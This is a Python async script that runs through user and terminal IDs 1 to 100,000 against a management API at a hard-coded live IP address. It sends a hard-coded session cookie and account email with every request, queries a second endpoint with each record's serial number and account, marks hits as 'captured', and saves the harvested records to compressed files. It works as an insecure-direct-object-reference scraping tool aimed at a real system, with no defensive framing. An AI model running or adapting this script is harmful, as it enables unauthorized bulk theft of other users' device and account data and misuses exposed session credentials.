import aiohttp
import asyncio
import json
import gzip
from collections import defaultdict

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
    "Connection": "Keep-Alive",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US",
    "Cache-Control": "no-cache",
    "DNT": "1",
    "Referer": "http://112.74.43.252/view/main.html",
    "X-Requested-With": "XMLHttpRequest",
    "Cookie": "JSESSIONID=D0DE49B214073304B11B1FAA26FE6CD5; user_home=http%3A%2F%2F112.74.43.252%2Flogin.html; user_id=1734448; authorization=undefined; sn=4WET294759948BF1AF8F15AF3F09687C; account=kollyopgki%40gmail.com%20; sign="
}

START = 1
END = 100000
SEM_LIMIT = 250

main_data = {}
pass_data = {}
second_data = {}

async def fetch_json(session, url, params=None):
    try:
        async with session.get(url, headers=HEADERS, params=params, timeout=10) as response:
            content_type = response.headers.get("Content-Type", "")
            if "application/json" in content_type:
                return await response.json()
            else:
                text = await response.text()
                return {"error": "Non-JSON response", "status": response.status, "body": text}
    except Exception as e:
        return {"error": str(e)}

async def process_num(session, sem, num):
    url1 = f"http://112.74.43.252/api/mgr/terminal/get/{num}"
    url2 = "http://112.74.43.252/api/mgr/userDevice/findByAccount"

    async with sem:
        res1 = await fetch_json(session, url1)
        main_data[num] = res1

        if not isinstance(res1, dict) or res1.get("code") != "0" or not res1.get("data"):
            return

        sn = res1["data"].get("sn")
        account = res1["data"].get("account")

        if not sn or not account:
            return

        res2 = await fetch_json(session, url2, params={"sn": sn, "account": account})
        second_data[num] = res2

        if isinstance(res2, dict) and res2.get("code") == "0":
            pass_data[num] = res2
            print(f"⭐: captured userId {num}")
        else:
            print(f"{num} checked")

def save_json_gz(filename, data):
    with gzip.open(filename, "wt", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

async def main():
    sem = asyncio.Semaphore(SEM_LIMIT)
    async with aiohttp.ClientSession() as session:
        tasks = [process_num(session, sem, num) for num in range(START, END + 1)]
        await asyncio.gather(*tasks)

    # Save files
    save_json_gz("main.json.gz", main_data)
    save_json_gz("pass.json.gz", pass_data)
    save_json_gz("second.json.gz", second_data)

if __name__ == "__main__":
    asyncio.run(main())